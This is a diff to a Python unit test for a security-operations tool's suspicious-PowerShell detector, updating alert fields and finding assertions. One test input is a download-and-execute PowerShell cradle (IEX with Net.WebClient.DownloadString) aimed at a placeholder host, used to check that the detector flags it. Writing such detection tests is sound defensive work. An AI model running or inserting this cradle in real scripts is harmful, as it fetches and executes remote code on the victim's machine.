@@ -8,30 +8,30 @@ from soc_tool.detections.suspicious_powershell import (
 from soc_tool.models.alert import Alert
 
 
-def create_powershell_alert(script_text: str) -> Alert:
+def create_alert(script_block_text: str) -> Alert:
     return Alert(
-        timestamp="2026-07-13T08:49:02.031+0000",
+        timestamp="2026-07-01T10:00:00.000+0000",
         agent_name="DC01",
-        rule_id="91816",
-        rule_level=4,
+        rule_id="91802",
+        rule_level=5,
         event_id="4104",
         username=None,
-        event_record_id="2001",
         source_ip=None,
-        script_block_text=script_text,
+        script_block_text=script_block_text,
         subject_username=None,
-        target_domain=None,
+        target_domain="SOCLAB",
         member_name=None,
+        event_record_id="17147",
         raw_data={},
     )
 
 
 def test_detect_suspicious_powershell() -> None:
-    detector = SuspiciousPowerShellDetector()
-
-    alert = create_powershell_alert(
+    alert = create_alert(
         "IEX (New-Object Net.WebClient).DownloadString('http://example.test')"
     )
+
+    detector = SuspiciousPowerShellDetector()
 
     findings = detector.detect([alert])
 
@@ -39,20 +39,18 @@ def test_detect_suspicious_powershell() -> None:
 
     finding = findings[0]
 
-    assert finding["detection"] == "Suspicious PowerShell"
-    assert "iex" in finding["matched_patterns"]
-    assert "downloadstring" in finding["matched_patterns"]
+    assert finding.title == "Suspicious PowerShell"
+    assert finding.severity == "HIGH"
+    assert finding.mitre_id == "T1059.001"
+    assert "iex" in finding.evidence["matched_patterns"]
+    assert "downloadstring" in finding.evidence["matched_patterns"]
 
 
 def test_ignore_benign_powershell() -> None:
-    detector = SuspiciousPowerShellDetector()
+    alert = create_alert("Get-Service")
 
-    alert = create_powershell_alert(
-        "Get-Service | Select-Object Name, Status"
-    )
+    detector = SuspiciousPowerShellDetector()
 
     findings = detector.detect([alert])
 
     assert findings == []
-
-
